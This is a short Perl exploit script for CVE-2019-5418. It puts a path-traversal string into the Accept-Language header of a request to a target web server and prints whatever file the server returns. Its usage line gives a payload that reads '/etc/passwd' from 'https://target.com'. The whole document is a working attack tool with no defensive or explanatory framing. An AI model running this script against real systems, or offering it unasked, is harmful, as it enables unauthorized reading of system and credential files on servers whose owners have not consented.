#!/usr/bin/perl
# CVE Details -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5418

use 5.010;
use strict;
use warnings;
use LWP::UserAgent;

sub main {
    if (@ARGV >= 2) {
        my $url   = $ARGV[0];
        my $file  = $ARGV[1];

        my $useragent = LWP::UserAgent -> new();
        my $request   = $useragent -> get($url,
            "Accept-Language"  => $file
        );
        my $content  = $request -> content();

        print "\n$content\n";
        exit;
    }

    print "Usage exploit: perl CVE-2019-5418.pl https://target.com '../../../../etc/passwd%00'\n";
}

main();
exit;